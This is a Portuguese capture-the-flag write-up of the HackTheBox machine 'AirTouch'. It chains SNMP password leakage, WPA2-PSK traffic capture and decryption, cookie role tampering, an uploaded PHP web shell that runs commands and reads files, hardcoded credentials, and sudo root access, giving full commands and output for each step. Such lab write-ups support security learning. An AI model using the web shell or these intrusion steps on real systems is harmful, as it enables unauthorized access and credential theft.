# AirTouch

## informações da máquina

| atributo | valor |
|----------|-------|
| **plataforma** | HackTheBox |
| **dificuldade** | Medium |
| **OS** | Linux |
| **IP** | 10.129.244.98 |
| **técnicas** | SNMP enumeration, WPA2-PSK traffic decryption, cookie tampering, unrestricted file upload, credential disclosure, sudo NOPASSWD |
| **link HTB** | [https://app.hackthebox.com/machines/AirTouch](https://app.hackthebox.com/machines/AirTouch) |

## resumo

a máquina expõe apenas SSH em TCP, mas um scan UDP revela SNMP com community `public`. a descrição SNMP vaza a senha padrão do usuário `consultant`, permitindo acesso via SSH ao host `AirTouch-Consultant`. esse usuário possui `sudo NOPASSWD: ALL`, o que libera o uso das interfaces wireless locais. a topologia descoberta nos arquivos do usuário mostra duas redes principais: `AirTouch-Internet`, com WPA2-PSK, e `AirTouch-Office`, com WPA2-Enterprise. ao conectar no SSID `AirTouch-Internet`, foi possível acessar o gateway `192.168.3.1`, capturar tráfego de um cliente, decriptar o PCAP com a PSK conhecida, roubar um cookie autenticado, alterar `UserRole=user` para `UserRole=admin`, fazer upload de um `.phtml` e ler `login.php`. a credencial vazada no código permitiu SSH no host `AirTouch-AP-PSK`, onde `sudo NOPASSWD: ALL` deu acesso root local e a `user flag`.

## enumeração/scanning

### port scanning

```bash
nmap -Pn -sT -sV -sC -T4 --min-rate 1000 -oA scans/airtouch_tcp_initial 10.129.244.98
```

**portas abertas:**
- 22/tcp - SSH, `OpenSSH 8.2p1 Ubuntu 4ubuntu0.11`

o scan TCP completo confirmou que não havia outra porta TCP exposta externamente.

```bash
nmap -Pn -sT -p- --min-rate 5000 -T4 -oA scans/airtouch_tcp_allports 10.129.244.98
```

```text
PORT   STATE SERVICE
22/tcp open  ssh
```

como a superfície TCP parecia pequena demais, um scan UDP foi necessário.

```bash
sudo nmap -Pn -sU -sV --top-ports 100 --defeat-icmp-ratelimit -T4 -oN scans/airtouch_udp_top100_sv.nmap 10.129.244.98
```

```text
PORT    STATE SERVICE VERSION
161/udp open  snmp    SNMPv1 server; net-snmp SNMPv3 server (public)
```

### SNMP

o script scan de SNMP confirmou a community `public` e vazou uma senha padrão no `sysDescr`.

```bash
sudo nmap -Pn -sU -sV -p161 --script 'snmp-*' -T4 -oN scans/airtouch_snmp_nse.nmap 10.129.244.98
```

```text
| snmp-brute:
|_  public - Valid credentials
| snmp-sysdescr: "The default consultant password is: RxBlZhLmOkacNWScmZ6D (change it after use it)"
|_  System uptime: 6m26.47s (38647 timeticks)
Service Info: Host: Consultant
```

o `snmpwalk` também revelou o contato, o hostname e a localização lógica do host.

```bash
snmpwalk -v2c -c public 10.129.244.98
```

```text
SNMPv2-MIB::sysContact.0 = STRING: admin@AirTouch.htb
SNMPv2-MIB::sysName.0 = STRING: Consultant
SNMPv2-MIB::sysLocation.0 = STRING: "Consultant pc"
```

## exploitation

### acesso inicial via SSH

com a senha vazada via SNMP, foi possível autenticar como `consultant`.

```bash
ssh consultant@AirTouch.htb
```

```text
consultant@AirTouch-Consultant:~$ id
uid=1000(consultant) gid=1000(consultant) groups=1000(consultant)

consultant@AirTouch-Consultant:~$ hostname -I
172.20.1.2
```

o diretório home continha dois arquivos de imagem, incluindo um diagrama de rede. a topologia indicava que o host atual era o laptop da vlan de consultoria e que existiam duas redes wireless relevantes:

- `AirTouch-Internet`, associada à rede `192.168.3.0/24`;
- `AirTouch-Office`, associada à rede corporativa `10.10.10.0/24`.

### enumeração wireless

o usuário `consultant` não podia controlar as interfaces wireless diretamente, mas possuía sudo irrestrito.

```bash
sudo -l
```

```text
User consultant may run the following commands on AirTouch-Consultant:
    (ALL) NOPASSWD: ALL
```

após virar root, as interfaces `wlan0` até `wlan6` ficaram utilizáveis para scan.

```bash
sudo -i
iw dev
iw dev wlan0 scan > /tmp/wlan0_scan_full.txt
```

o inventário dos SSIDs mostrou a diferença entre os dois vetores.

```text
AirTouch-Internet BSSID=f0:9f:c2:a3:f1:a7 freq=2437 channel=6 auth=PSK
AirTouch-Office BSSID=ac:8b:a9:f3:a1:13 freq=5220 channel=44 auth=802.1X
AirTouch-Office BSSID=ac:8b:a9:aa:3f:d2 freq=5220 channel=44 auth=802.1X
```

apesar de `AirTouch-Office` parecer o caminho final por usar WPA2-Enterprise e haver `eaphammer` em `/root/eaphammer`, a rota para a user começou pelo SSID PSK.

### conexão ao AirTouch-Internet

a PSK usada para `AirTouch-Internet` era `challenge`. com `wpa_supplicant`, a interface `wlan2` recebeu um endereço na rede dos tablets.

```bash
cat > /tmp/airtouch-internet.conf <<'EOF'
network={
    ssid="AirTouch-Internet"
    psk="challenge"
    key_mgmt=WPA-PSK
}
EOF

ip link set wlan2 down
ip link set wlan2 up
wpa_supplicant -B -i wlan2 -c /tmp/airtouch-internet.conf
dhclient wlan2
ip addr show wlan2
```

```text
inet 192.168.3.84/24 brd 192.168.3.255 scope global dynamic wlan2
```

o gateway da rede expunha SSH e HTTP.

```bash
nmap -sT -Pn -p22,80,443,8080 192.168.3.1
```

```text
PORT     STATE  SERVICE
22/tcp   open   ssh
80/tcp   open   http
443/tcp  closed https
8080/tcp closed http-proxy
```

o HTTP redirecionava para `login.php`.

```bash
curl -i http://192.168.3.1/
```

```text
HTTP/1.1 302 Found
location: login.php
```

### captura e decriptação do tráfego WPA2-PSK

como tentativas de login com credenciais comuns falharam, o próximo passo foi capturar tráfego do cliente associado ao AP `AirTouch-Internet`.

```bash
airodump-ng --bssid F0:9F:C2:A3:F1:A7 --channel 6 \
  --write /tmp/airtouch_internet \
  --output-format pcap,csv wlan3
```

```text
CH  6 ][ Elapsed: 1 min ][ 2026-04-18 02:14 ][ WPA handshake: F0:9F:C2:A3:F1:A7

BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes
F0:9F:C2:A3:F1:A7  28:6C:07:FE:A3:22  -29   48 - 2      0     1335  EAPOL
```

com o handshake e a PSK conhecida, o tráfego foi decriptado.

```bash
airdecap-ng -e AirTouch-Internet -p challenge /tmp/airtouch_internet-01.cap
```

```text
Number of decrypted WPA  packets        14
```

o PCAP decriptado continha uma requisição autenticada para `/lab.php`.

```bash
strings /tmp/airtouch_internet-01-dec.cap \
  | grep -Ei 'PHPSESSID|UserRole|Cookie:|POST|Username|Password|login.php|index.php' -A5 -B5
```

```text
GET /lab.php HTTP/1.1
Host: 192.168.3.1
Cookie: PHPSESSID=f3jj8a1eqk76loedjusoidee5b; UserRole=user

Welcome manager
Congratulation! You have logged into password protected page. <a href="index.php">Click here</a> to go to index.php to get the flag.
```

### cookie tampering e upload de arquivo

o cookie de sessão era válido, e o controle de papel era feito no cookie `UserRole`. alterar o valor para `admin` liberou o formulário de upload em `index.php`.

```bash
export COOKIE='PHPSESSID=f3jj8a1eqk76loedjusoidee5b; UserRole=admin'
curl -s -b "$COOKIE" http://192.168.3.1/index.php | tee /tmp/index_admin.html
```

```text
<h3>Hello, manager (admin)!</h3>
<form action="index.php" method="post" enctype="multipart/form-data">
```

foi enviado um arquivo `.phtml` simples para ler arquivos e executar comandos.

```bash
cat > /tmp/reader.phtml <<'EOF'
<?php
if (isset($_GET['file'])) {
    echo "<pre>";
    echo htmlspecialchars(file_get_contents($_GET['file']));
    echo "</pre>";
}
if (isset($_GET['cmd'])) {
    echo "<pre>";
    system($_GET['cmd']);
    echo "</pre>";
}
?>
EOF

curl -i -b "$COOKIE" \
  -F "fileToUpload=@/tmp/reader.phtml" \
  -F "submit=Upload File" \
  http://192.168.3.1/index.php
```

```text
The file reader.phtml has been uploaded to folder uploads/
```

a execução do payload confirmou código remoto como `www-data`.

```bash
curl -s -b "$COOKIE" 'http://192.168.3.1/uploads/reader.phtml?cmd=id'
```

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### vazamento de credencial no login.php

com leitura de arquivos, o código de `login.php` revelou credenciais hardcoded.

```bash
curl -s -b "$COOKIE" \
  'http://192.168.3.1/uploads/reader.phtml?file=/var/www/html/login.php'
```

```text
$logins = array(
    /*'user' => array('password' => 'JunDRDZKHDnpkpDDvay', 'role' => 'admin'),*/
    'manager' => array('password' => '2wLFYNh4TSTgA5sNgT4', 'role' => 'user')
);
```

a credencial comentada funcionou para SSH no gateway PSK.

```bash
ssh user@192.168.3.1
```

```text
user@AirTouch-AP-PSK:~$ id
uid=1000(user) gid=1000(user) groups=1000(user)
```

## privilege escalation

### sudo NOPASSWD no AirTouch-AP-PSK

no host `AirTouch-AP-PSK`, o usuário `user` também tinha sudo irrestrito.

```bash
sudo -l
```

```text
User user may run the following commands on AirTouch-AP-PSK:
    (ALL) NOPASSWD: ALL
```

com isso foi possível obter root local no gateway PSK.

```bash
sudo -i
id
hostname
```

```text
uid=0(root) gid=0(root) groups=0(root)
AirTouch-AP-PSK
```

a `user flag` estava em `/root/user.txt`, com permissão de leitura para root e grupo `1001`.

```bash
ls -la /root
```

```text
-rw-r----- 1 root 1001   33 Apr 18 00:51 user.txt
```

**user flag:** ✓

### estado da root flag

a root flag ainda não foi obtida nesta etapa do writeup. o host `AirTouch-AP-PSK` revelou arquivos que parecem preparar o próximo estágio contra `AirTouch-Office`, incluindo certificados e um script de envio.

```text
/root/certs-backup/ca.crt
/root/certs-backup/server.crt
/root/certs-backup/server.key
/root/send_certs.sh
/root/wlan_config_aps
```

**root flag:** pendente

## lições aprendidas

- quando a superfície TCP parece mínima, SNMP em UDP pode ser o vetor principal de entrada.
- em ambientes com topologia wireless, arquivos aparentemente decorativos podem explicar a rede e evitar enumeração cega.
- WPA2-PSK com PSK conhecida permite decriptar tráfego capturado e recuperar cookies HTTP em claro.
- controles de autorização em cookie, como `UserRole`, devem ser tratados como dados controlados pelo cliente.
- `sudo NOPASSWD: ALL` apareceu em mais de um host e transformou shells de usuário em controle root local.

---

*writeup by kp*
